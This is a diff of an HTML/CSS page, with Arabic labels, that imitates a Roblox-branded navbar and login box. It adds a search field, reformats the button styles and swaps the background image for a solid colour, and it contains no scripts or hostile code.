@@ -8,14 +8,11 @@
 body{
   margin:0;
   font-family:Arial, sans-serif;
+  background:#1c1f26;
   color:white;
-  background:
-    linear-gradient(rgba(20,22,30,0.85), rgba(20,22,30,0.85)),
-    url("IMG_0161.png") no-repeat center center fixed;
-  background-size:cover;
 }
 
-/* الشريط */
+/* ===== الشريط العلوي ===== */
 .navbar{
   background:linear-gradient(#1a1a1a,#0f0f0f);
   height:64px;
@@ -23,24 +20,78 @@ body{
   align-items:center;
   padding:0 18px;
 }
-.logo{font-size:24px;font-weight:900;margin-right:20px;}
-.links{display:flex;gap:18px;}
-.links a{color:#ddd;text-decoration:none;font-size:14px;}
-.links a:hover{color:white}
-.actions{margin-left:auto;display:flex;gap:10px;}
-.btn-blue{background:#2a7cff;border:none;color:white;padding:8px 14px;border-radius:8px;}
-.btn-dark{background:#111;border:1px solid #555;color:white;padding:8px 14px;border-radius:8px;}
 
-/* الصندوق */
-.main{display:flex;justify-content:center;margin-top:70px;}
+.logo{
+  font-size:24px;
+  font-weight:900;
+  margin-right:20px;
+}
+
+.links{
+  display:flex;
+  gap:18px;
+}
+.links a{
+  color:#ddd;
+  text-decoration:none;
+  font-size:14px;
+}
+.links a:hover{color:white}
+
+/* البحث */
+.search{
+  margin:auto;
+  display:flex;
+  align-items:center;
+  background:#222;
+  border-radius:10px;
+  padding:6px 14px;
+  width:420px;
+}
+.search input{
+  background:transparent;
+  border:none;
+  color:white;
+  outline:none;
+  width:100%;
+}
+
+/* الأزرار */
+.actions{
+  margin-left:auto;
+  display:flex;
+  gap:10px;
+}
+.btn-blue,.btn-dark{
+  width:120px;
+  padding:8px 0;
+  border-radius:8px;
+  font-weight:bold;
+}
+.btn-blue{
+  background:#2a7cff;
+  border:none;
+  color:white;
+}
+.btn-dark{
+  background:#111;
+  border:1px solid #555;
+  color:white;
+}
+
+/* ===== صندوق تسجيل الدخول ===== */
+.main{
+  display:flex;
+  justify-content:center;
+  margin-top:70px;
+}
 .box{
-  background:rgba(35,38,47,0.95);
+  background:#23262f;
   width:380px;
   padding:25px;
-  border-radius:12px;
-  text-align:center;
+  border-radius:14px;
 }
-.box h2{margin:10px 0;}
+.box h2{text-align:center;}
 .box input{
   width:100%;
   padding:12px;
@@ -68,7 +119,7 @@ body{
   color:white;
   margin-top:10px;
 }
-.small{font-size:13px;color:#ccc;margin:12px 0;}
+.small{text-align:center;font-size:13px;color:#ccc;margin:12px 0;}
 .line{height:1px;background:#444;margin:15px 0;}
 </style>
 </head>
@@ -77,12 +128,18 @@ body{
 
 <div class="navbar">
   <div class="logo">ROBLOX</div>
+
   <div class="links">
     <a href="#">الرئيسية</a>
     <a href="#">السوق</a>
     <a href="#">إنشاء</a>
     <a href="#">Robux</a>
   </div>
+
+  <div class="search">
+    <input type="text" placeholder="بحث">
+  </div>
+
   <div class="actions">
     <button class="btn-blue">تسجيل الدخول</button>
     <button class="btn-dark">تسجيل</button>
